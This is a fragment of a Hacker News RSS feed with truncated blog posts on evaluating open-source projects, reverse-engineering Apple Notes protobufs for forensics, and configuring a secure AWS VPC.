<p>That only scratches the surface. You can also use the service’s time range option to find that <a href="https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=LibreOffice,OpenOffice" target="_blank" rel="noopener noreferrer">LibreOffice has been more popular than OpenOffice since late 2016</a>. (Which, as it happens, is a few months after I declared LibreOffice the victor between the two.)</p>
<p>Or, to pick a more enterprise-oriented search, when it comes to container orchestration, we all know <a href="https://www.zdnet.com/article/kubernetes-jumps-in-popularity/" target="_blank" rel="noopener noreferrer">Kubernetes is the winner</a>. But, when did it become clear that it was going to beat <a href="https://docs.docker.com/engine/swarm/" target="_blank" rel="noopener noreferrer">Docker Swarm Mode</a> and <a href="https://d2iq.com/" target="_blank" rel="noopener noreferrer">Mesosphere, now D2IQ</a>? One Google Trend search later, and you see that by the spring of 2016, <a href="https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=Kubernetes,Docker%20Swarm,Mesosphere" target="_blank" rel="noopener noreferrer">Kubernetes had already grabbed a large lead</a> in container orchestration mindshare.</p>
<p>Finally, Google Trends is also good when you want to look at what hasn’t happened yet. For example, “breakouts” are sudden rises of traffic on a specific search term. By doing a general search on “technology,” I found the top breakout term was one I’d never even heard of—although I make my living from tracking what’s hot in tech: Transportation as a Service (TaaS). Keep an eye on it; interest is high.</p>
<h3>Moving to a new model of judging open-source software</h3>
<p>It would be great if there were a genuinely useful rating system that would help people discover excellent but less-visible open-source projects. But an easy way to work out which of the tens of thousands of projects are the vital, important ones – a software Yelp, if you will – doesn’t exist. It may never come to be.</p>
<p>Hope springs eternal. Brian Profitt, <a href="https://www.redhat.com/en" target="_blank" rel="noopener noreferrer">Red Hat</a>‘s Open Source Program Office (OSPO) manager, is working with others on a new project to make it easy to evaluate open-source projects: <a href="https://chaoss.community/" target="_blank" rel="noopener noreferrer">Project CHAOSS</a>. This Linux Foundation project is devoted to creating analytics and metrics that help define open-source community health.</p>
<p>“Since I started working at Red Hat, figuring out a way to quantifiably measure community health has been a priority for my team,” Profitt explains. “At first, we took a mega-dashboard approach, using the tools provided by the Spanish vendor <a href="https://bitergia.com/" target="_blank" rel="noopener noreferrer">Bitergia</a>. They use open-source projects like <a href="https://chaoss.github.io/grimoirelab/" target="_blank" rel="noopener noreferrer">Grimoirelabs</a> to put together amazing dashboards that give daily updated reports on how our stewarded projects were doing.”</p>
<p>However, like the other efforts we’ve been discussing, this approach ran into trouble. This time it’s too much information. “Most of our community managers did not have the time to analyze this firehose of data and make meaningful decisions based on this,” Profitt says.</p>
<p>So Red Hat also began working on Project CHAOSS. This pulled together Grimoirelab and similar programs, such as <a href="http://www.augurlabs.io/" target="_blank" rel="noopener noreferrer">Augur</a> and Red Hat’s own <a href="https://github.com/chaoss/prospector" target="_blank" rel="noopener noreferrer">Prospector</a>. CHAOSS has two sides: People working on software applications, and “others working on what things could be defined as part of a community’s health,” Profitt says. “In the past, the argument was always, ‘Well, my community is different because of X, so you can’t judge us by the same standards as Y.’”</p>
<p>Profitt and CHAOSS disagree with such an argument. “Look at a small hamlet in rural China. Look at a mega-city in Europe. Both communities, but vastly different, right? Except they both have to have ways to deal with water, food, sanitation. They both have to have ways of getting around. Yes, in the hamlet it could be bicycles on a dirt road, and in the big city, it will be streets, highways, trams, subways. But at a fundamental level, the health of the community only depends on if the appropriate level of transportation is available, not what kind.”</p>
<p>While the focus is on community,<a href="https://chaoss.community/metrics/" target="_blank" rel="noopener noreferrer"> CHAOSS’s metrics</a> can be used by project managers and maintainers as well. Its metrics include <a href="https://chaoss.community/metric-types-of-contributions/" target="_blank" rel="noopener noreferrer">what kinds of contributions are being made</a>; <a href="https://chaoss.community/metrics/#user-content-focus-area---when" target="_blank" rel="noopener noreferrer">when the contributions are made</a>; and <a href="https://chaoss.community/metrics/#user-content-focus-area---who" target="_blank" rel="noopener noreferrer">who’s making the contributions</a>. All of which are vital to understanding the overall health of a project.</p>
<p>C…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.functionize.com/blog/wheres-the-yelp-for-open-source-tools/">https://www.functionize.com/blog/wheres-the-yelp-for-open-source-tools/</a></em></p>]]>
            </description>
            <link>https://www.functionize.com/blog/wheres-the-yelp-for-open-source-tools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533402</guid>
            <pubDate>Sun, 20 Sep 2020 11:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Revisiting Apple Notes (6): The Protobuf]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 47 (<a href="https://news.ycombinator.com/item?id=24533249">thread link</a>) | @LaSombra
<br/>
September 20, 2020 | https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/ | <a href="https://web.archive.org/web/*/https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemprop="articleBody"> <p><strong>TL;DR</strong>: This post explains portions of two protobufs used by Apple, one for the Note format itself and another for embedded objects. More importantly, it explains how you can figure out the structure of protobufs.</p> <!--more--> <h2 id="background">Background</h2> <p>Previous entries in this series covered how to deal with <a href="https://ciofecaforensics.com/2020/01/10/apple-notes-revisited/">Apple Notes</a> and the <a href="https://ciofecaforensics.com/2020/01/13/apple-notes-revisited-easy-embedded-objects/">embedded objects</a> in them, including <a href="https://ciofecaforensics.com/2020/01/14/apple-notes-revisited-embedded-tables/">embedded tables</a> and <a href="https://ciofecaforensics.com/2020/01/20/apple-notes-revisited-galleries/">galleries</a>. Throughout these posts, I have referred to the fact that Apple uses protocol buffers (protobufs) to store the information for both notes and the embedded objects within them. What I have not yet done is actually provide the .proto file that was used to generate the Ruby output, or explained how you can develop the same on your app of interest. If you only care about the first part of that, you can view the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/notestore.proto">.proto file</a> or the <a href="https://github.com/threeplanetssoftware/apple_cloud_notes_parser/blob/master/proto/protobuf_config.py">config</a> I use for <a href="https://github.com/jmendeth/protobuf-inspector">protobuf-inspector</a>. Both of these files are just a start to pull out the important parts for processing and can certainly be improved.</p> <p>As with previous entries, I want to make sure I give credit where it is due. After pulling apart the Note protobuf and while I was trying to figure out the table protobuf, I came across <a href="https://github.com/dunhamsteve">dunhamsteve’s</a> work. As a result, I went back and modified some of my naming to better align to what he had <a href="https://github.com/dunhamsteve/notesutils/blob/master/notes.md">published</a> and added in some fields like version which I did not have the data to discover.</p> <h2 id="what-is-a-protocol-buffer">What is a Protocol Buffer?</h2> <p>To quote directly from <a href="https://developers.google.com/protocol-buffers">the source</a>,</p> <blockquote> <p>Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p> </blockquote> <p>What does that mean? It means a protocol buffer is a way you can write a specification for your data and use it in many projects and languages with one command. The end result is source code for whatever language you are writing in. For example, <a href="https://github.com/sballin/alfred-search-notes-app/blob/master/search/proto/notestore.pb.go">Sean Ballinger’s Alfred Search Notes App</a> used my <code>notestore.proto</code> file to compile to Go instead of Ruby to interact with Notes on MacOS. When you use it in your program, the data which you save will be a raw data stream which won’t look like much, but will be intelligable to any code with that protobuf definition.</p> <p>The definition is generally a <code>.proto</code> file which would look something like:</p> <figure><pre><code data-lang="protobuf"><span>syntax</span> <span>=</span> <span>"proto2"</span><span>;</span>

<span>// Represents an attachment (embedded object)</span>
<span>message</span> <span>AttachmentInfo</span> <span>{</span>
   <span>optional</span> <span>string</span> <span>attachment_identifier</span> <span>=</span> <span>1</span><span>;</span>
   <span>optional</span> <span>string</span> <span>type_uti</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span></code></pre></figure> <p>This definition would have just one message type (AttachmentInfo), with two fields (attachment_identifier and type_uti), both optional. This is using the <code>proto2</code> syntax.</p> <h2 id="why-care-about-protobufs">Why Care About Protobufs</h2> <p>Protobufs are everywhere, especially if you happen to be working with or looking at Google-based systems, such as Android. Apple also uses a lot of them in iOS, and for people that have to support both operating systems, using a protobuf makes the pain of maintaining two different code bases slightly less annoying because you can compile the same definition to different languages. If you are in forensics, you may come across something that looks like it isn’t plaintext and discover that you’re actually looking at a protobuf. When it comes specifically to Apple Notes, protobufs are used both for the Note itself and the attachments.</p> <h2 id="how-to-use-a-proto-file">How to Use a .proto file</h2> <p>Assuming you have a <code>.proto</code> file, either from building one yourself or from finding one from your favorite application, you can compile it to your target language using <a href="https://github.com/protocolbuffers/protobuf/releases">protoc</a>. The resulting file can then be included in your project using whatever that language’s include statement is to create the necessary classes for the data. For example, when writing Apple Cloud Notes Parser in Ruby, I used <code>protoc --ruby_out=. ./proto/notestore.proto</code> to compile it and then <code>require_relative 'notestore_pb.rb'</code> in my code to include it.</p> <p>If I wanted instead to add in support for python, I would only have to make this change: <code>protoc --ruby_out=. --python_out=. ./proto/notestore.proto</code></p> <h2 id="how-can-you-find-a-protobuf-definition-file">How Can You Find a Protobuf Definition File?</h2> <p>If you come up against a protobuf in an application you are looking at, you might be able to find the <code>.proto</code> protobuf definition file in the application itself or somewhere on the forensic image. I ended up going through an iOS 13 forensic image earlier this year and found that Apple still had some of theirs on disk:</p> <figure><pre><code data-lang="shell"><span>[</span>notta@cuppa iOS13_logical]<span>$ </span>find | <span>grep</span> <span>'\.proto$'</span>
./System/Library/Frameworks/MultipeerConnectivity.framework/MultipeerConnectivity.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievementsBackCompat.proto
./System/Library/PrivateFrameworks/ActivityAchievements.framework/ActivityAchievements.proto
./System/Library/PrivateFrameworks/CoreLocationProtobuf.framework/Support/Harvest/CLPCollectionRequest.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDatabaseCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingDomainCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingInvitationCodables.proto
./System/Library/PrivateFrameworks/ActivitySharing.framework/ActivitySharingCloudKitCodables.proto
./System/Library/PrivateFrameworks/CloudKitCode.framework/RecordTransport.proto
./System/Library/PrivateFrameworks/RemoteMediaServices.framework/RemoteMediaServices.proto
./System/Library/PrivateFrameworks/CoreDuet.framework/knowledge.proto
./System/Library/PrivateFrameworks/HealthDaemon.framework/Statistics.proto
./System/Library/PrivateFrameworks/AVConference.framework/VCCallInfoBlob.proto
./System/Library/PrivateFrameworks/AVConference.framework/captions.proto</code></pre></figure> <p>Some of these are <em>really</em> interesting when you look at them, particularly if you care about their location data and pairing. You don’t even have to have an iOS forensic image sitting around as all of the same files are included in your copy of MacOS 10.15.6, as well, if you run <code>sudo find /System/ -iname "*.proto"</code>. I am not including any interesting snippets of those because they are copyrighted by Apple and I would explicitly note that none are related to Apple Notes or the contents of this post.</p> <p>In general, you should not expect to find these definitions sitting around since the definition file isn’t needed once the code is generated. For more open source applications, you might be interested in some <a href="https://www.google.com/search?q=ext%3Aproto++AND+inurl%3Aproto+AND+message+AND+proto2">Google Dorks</a>, especially when looking at Android artifacts, as you might still find them.</p> <h2 id="how-can-you-rebuild-the-protobuf">How Can You Rebuild The Protobuf?</h2> <p>But what if you can’t find the definition file, how can you rebuild it yourself? This was the most interesting part of rewriting Apple Cloud Notes Parser as I had no knowledge of how Apple typically represents data, nor protobufs, so it was a fun learning adventure.</p> <p>If you have nothing else, the <code>protoc --decode-raw</code> command can give you an intial look at what is in the data, however this amounts to not much more than pretty printing a JSON object, it doesn’t do a great job of telling you you what might be in there. I made heavy use of mildsunrise’s <a href="https://github.com/mildsunrise/protobuf-inspector">protobuf-inspector</a> which at least makes an attempt to tell you what you might be looking at. Another benefit to using this is that it lets you incrementally build up your own definition by editing a file named <code>protobuf_config.py</code> in the protobuf-insepctor folder.</p> <p>For example, below is the output from protobuf-inspector when I ran it on the Gunzipped contents of one of the first notes in my test database.</p> <figure><pre><code data-lang="python"><span>[</span><span>notta</span><span>@</span><span>cuppa</span> <span>protobuf</span><span>-</span><span>inspector</span><span>]</span><span>$</span> <span>python3</span> <span>main</span><span>.</span><span>py</span> <span>&lt;</span> <span>~/</span><span>note_18</span><span>.</span><span>blob</span> 
<span>root</span><span>:</span>
    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
        <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
        <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
            <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>"Pure blob title"</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>2</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>8</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>3</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>4</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>14</span><span>)</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>10</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>,</span> <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>)</span>
                <span>5</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
            <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
                <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                <span>3</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span>
                    <span>2</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>4294967295</span>
            <span>4</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                    <span>1</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>bytes</span> <span>(</span><span>16</span><span>)</span>
                        <span>0000</span>   <span>EE</span> <span>FE</span> <span>10</span> <span>DA</span> <span>5</span><span>A</span> <span>79</span> <span>43</span> <span>25</span> <span>88</span> <span>BA</span> <span>6</span><span>D</span> <span>CA</span> <span>E2</span> <span>E9</span> <span>B7</span> <span>EC</span>                          <span>....</span><span>ZyC</span><span>%</span><span>..</span><span>m</span><span>.....</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>24</span><span>)</span>
                    <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>9</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
                <span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>5</span>
                <span>2</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>(</span><span>1</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>0</span><span>,</span> <span>3</span> <span>&lt;</span><span>varint</span><span>&gt;</span> <span>=</span> <span>1</span><span>)</span>
            <span>5</span> <span>&lt;</span><span>chunk</span><span>&gt;</span> <span>=</span> <span>message</span><span>:</span>
          …</code></pre></figure></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/">https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</a></em></p>]]>
            </description>
            <link>https://ciofecaforensics.com/2020/09/18/apple-notes-revisited-protobuf/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24533249</guid>
            <pubDate>Sun, 20 Sep 2020 11:02:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Demystifying AWS VPC: A short step-by-step guide to creating a secure AWS VPC]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24533200">thread link</a>) | @dinomad
<br/>
September 20, 2020 | https://scorpil.com/post/aws-vpc/ | <a href="https://web.archive.org/web/*/https://scorpil.com/post/aws-vpc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="container"><div><article itemscope="" itemtype="http://schema.org/BlogPosting"><div itemprop="articleBody"><p>VPC is the topic that flies under the radar of many Software Developers, despite being present in every AWS account (well, maybe not for accounts created before 2009… But that’s unlikely). There are a few reasons for this I can think of:</p><ol><li>Big companies have Ops/DevOps/SysAdmin/SRE/Security departments that take care of VPC</li><li>Startups often don’t bother tuning it - everything works with default settings after all</li><li>Networking is complicated and is rarely regarded as fun</li></ol><p>Despite those somewhat justified arguments, most developers that deal with AWS would benefit from digging deeper into VPC setup and it’s configuration. Here are my counterpoints:</p><ol><li>Understanding VPC will help you communicate with; Ops/DevOps/SysAdmin/SRE/Security department much more efficiently</li><li>Everything works by default because everything is open (i.e. unsecure) by default</li><li>Oh but it <em>is</em> fun when you dig deep enough</li></ol><p>So let’s take a careful look into AWS networking from the software engineering perspective. This post requires from the reader a very basic level of familiarity with AWS terminology and networking: you need to understand things like regions and availability zones, and have an idea of what an IP address is.</p><p>To make this post a bit less abstract, we will configure a VPC for a common real-world scenario: distributed application running in two availability zones in a single region consisting of <em>public</em> EC-2 instances serving a web-application and <em>private</em> EC-2 instances hosting a database. You can improve on the architecture by using RDS, adding a loadbalancer, configuring VPC peering with other regions, etc., but we will leave those topics out of the scope of this post - the topic at hand is complicated enough.</p><h3 id="vpc---what-is-it-actually">VPC - what is it actually</h3><p>VPC stands for Virtual Private Cloud, which is a very apt name for a service, unlike some other AWS services I can think of…</p><ul><li>It’s <strong>Virtual</strong>, because like most user-facing things in modern clouds it’s powered by software and not copper. Hence its flexibility: neither you nor AWS will need to plug in a single RJ45 jack to configure it;</li><li>It’s <strong>Private</strong>, because it allows you to carve out your own dedicated space for your cloud infrastructure, walled out and carefully guarded against the dangers of the public internet;</li><li>It’s a <strong>Cloud</strong> because, well, it’s in <strong>AWS</strong>. Or, actually, the better way to think about it as being <em>around</em> AWS.</li></ul><p>In other words, the idea of VPC is to give the user a granular set of controls over what networks requests are allowed to reach its services from the outside, and how to route the requests inside the cloud infrastructure.</p><p>VPC operates on the regional level, meaning that if you want your application to span multiple regions you will need to perform VPC setup for each region separately and configure a VPC peering between them.</p><p>„Fresh“ AWS accounts come with the „default“ VPC preconfigured. You can’t really start, for example, an EC2 instance without any VPC at all, so „default“ VPC is where the new instances get launched into if nothing else is configured (hence the „default“ name). This way amazon manages to balance user-friendliness with flexibility, and that’s why launching an EC2 instance on a „fresh“ account works out of the box. The problem is, however, that the default VPC is not tailored in any way to the needs of your application, so it will allow all incoming traffic to all existing instances. Correctly configured Security Groups help somewhat protect your resources from completely exposing their ports to the public, and to be frank they are often completely sufficient to protect a simple app. However, as the infrastructure grows to accommodate more distinct components and services with complicated access patterns between them, you might want to invest in a more delicate access configuration.</p><p>When creating a custom VPC, there are two important decisions to make:</p><ul><li><p>the size of the VPC: e.g. roughly the number of instances and services you plan to <strong>ever</strong> host inside the VPC. You can’t change this value so make it big. Normally, you wouldn’t go lower than a few thousand addresses.</p></li><li><p>the private IP address range. Instances inside your VPC will receive IP addresses from this address range. Technically, nothing stops you from choosing any IP range you‘d like; however, if your private IP matches the IP of anything on the public internet you won’t be able to access it from within the VPC. For this reason, internal networks are configured to use the subset of one of the following <a href="https://en.wikipedia.org/wiki/Reserved_IP_addresses">reserved</a> IP ranges:</p><ul><li>10.0.0.0-10.255.255.255 - 16 million private IPs in total, the default choice for cloud hosting.</li><li>172.16.0.0 – 172.31.255.255 - almost 1 million IPs</li><li>192.168.0.0 – 192.168.255.255 - 65536 IP‘s, commonly seen on home routers</li></ul></li></ul><p>For our VPC we want to have around 4000 IPs available in 10.x.x.x range. We can’t enter those numbers directly into the VPC configuration, we need to translate them into a <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">CIDR</a> notation first. CIDR is just a special format to describe an IP sub-range concisely. You can use IP subnet calculators like <a href="https://cidr.xyz/">cidr.xyz</a> (for IPv4) and <a href="https://cidrv6.xyz/">cidrv6.xyz</a> (for IPv6) to get an intuition into how CIDR works. CIDR value for our example is 10.0.0.0/20.</p><p>We will also enable IPv6 on our VPC. AWS VPC’s use IPv4 as a default addressing format, IPv6 configuration is completely optional. The approach AWS takes to IPv6 routing is quite different than what we used to for IPv4. IPv6 spec defines address range `fc00::/7` to be private but it’s used much less frequently than 10.x.x.x in IPv4. Ipv6 address space is just so large, that AWS simply allocates /56 public address range from his own address pool to your VPC and calls it a day. For this reason, there are no “private” IPv6 addresses in AWS. IPv6 range allocated to every VPC in AWS contains 2^72 addresses, which will be more than enough for *any* VPC ever. Just to put the number into perspective, it’s enough to assign an IPv6 address to each grain of sand on the planet. The ability to assign globally unique addresses to each of your resources makes network architecture in many ways simpler, but at the same time, it makes secure routing configuration even more important. We’ll discuss the reasons for it in more detail in a subnet section.</p><p>As a summary, here’s what our initial VPC configuration looks like:</p><table><thead><tr><th>Parameter</th><th>Value</th></tr></thead><tbody><tr><td>Name</td><td><code>my-secure-vpc</code> (can be anything really)</td></tr><tr><td>CIDR block</td><td><code>10.0.0.0/20</code></td></tr><tr><td>IPv6</td><td>Amazon-provided IPv6 CIDR block (in context of this post let’s assume it’s <code>2001:db8::aa00::/56</code>)</td></tr></tbody></table><h3 id="internet-gateway">Internet Gateway</h3><p>Internet Gateway is an abstract VPC component that represents internet access. The only purpose of the Internet Gateway is to serve as a source/target in the VPC routing configuration. You can’t really configure it in any meaningful way, apart from attaching it to VPC. Internet Gateway is present from the start in the default VPC, but <strong>it won’t be created</strong> for any custom VPC you create. Since we want to be able to access some resources in our VPC from the Internet, we need to create a new Internet Gateway and attach it to our VPC.</p><h3 id="subnets">Subnets</h3><p>The cornerstone of understanding VPC is understanding the concept of subnets. In short, <strong>subnet</strong> is a way of splitting your VPC into small manageable chunks, each of which contains instances and services with a similar type of network access. The „type of network access“ here is up to you to define, but in our case, we want a „private“ subnets for database instances and a „public“ subnet for our webserver. An important detail to remember is that subnets can’t span multiple availability zones. In our case we want our application to work in two different availability zones, this means we need “private” and “public” subnet in each of them, 4 subnets in total. Fortunately, it’s easy to configure functionally similar subnets by attaching them to the same routing table (more about them in the next section).</p><p>Subnets are defined in CIDR notation, which we already discussed in VPC section. AWS makes sure that you will not define two overlapping subnets, because that would break our routing logic. For each subnet, AWS reserves first four and last one IP’s for its internal tasks, so it’s common to configure the size of the subnet of at least /24. This size makes our IP addresses look “cleaner”: we can distinguish subnet based on the value of the second-to-last octet in the IP address. You can play around with a subnet calculator to understand why that’s the case. For IPv6, AWS set subnet size to /64 (not configurable).</p><p>You can configure the subnet to automatically map a public IPv4 address for all instances launched into it - we will need to do this for our public subnet.</p><p>Considering anything above, our 4 new subnets would look something like this:</p><table><thead><tr><th>Name</th><th>CIDR (v4)</th><th>CIDR (v6)</th><th>AZ</th><th>Public IPv4</th></tr></thead><tbody><tr><td>public-a</td><td>10.0.1.0/24</td><td>2001:db8::aa01/56</td><td>a</td><td>✓</td></tr><tr><td>public-b</td><td>10.0.2.0/24</td><td>2001:db8::aa02/56</td><td>b</td><td>✓</td></tr><tr><td>private-a</td><td>10.0.3.0/24</td><td>2001:db8::aa03/56</td><td>a</td><td></td></tr><tr><td>private-b</td><td>10.0.4.0/24</td><td>2001:db8::aa04/56</td><td>b</td><td></td></tr></tbody></table><h3 id="route-tables">Route tables</h3><p><em>Route tables</em> fill the role of the router for your VPC. They allow you to configure destinations for packets depending on their destination IP.</p><p>When you first create a VPC, a single “default” route table is created for you. It contains two rules needed to route private traffic internally within our VPC:</p><table><thead><tr><th>Destination</th><th>Target</th></tr></thead><tbody><tr><td><code>10.0.0.0/20</code></td><td>local</td></tr><tr><td><code>2001:db8::aa01/64</code></td><td>local</td></tr></tbody></table><p>All subnets that we created are by default associated with this route table. It’s a good security practice to make defaults as restricted as possible, so we will keep default route 